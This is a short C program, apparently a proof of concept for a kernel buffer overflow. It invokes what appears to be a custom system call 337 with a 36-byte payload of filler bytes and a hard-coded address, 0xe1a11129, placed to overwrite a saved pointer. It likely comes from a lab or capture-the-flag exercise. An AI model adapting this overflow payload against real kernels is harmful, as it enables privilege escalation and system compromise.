#include <stdio.h>
#include <unistd.h>
#include <string.h>

int call_337(char *str, int len)
{
	int ret;
	asm volatile ("int $0x80\n\r":"=a"(ret):"a"(337), "b"(str), "c"(len));
	return ret;
}

int main(void)
{
	char buf[128];
	int i;
	memset(buf, 'a', 128);
	*(unsigned int *)&buf[32] = 0xe1a11129;
	return call_337(buf, 36);
}
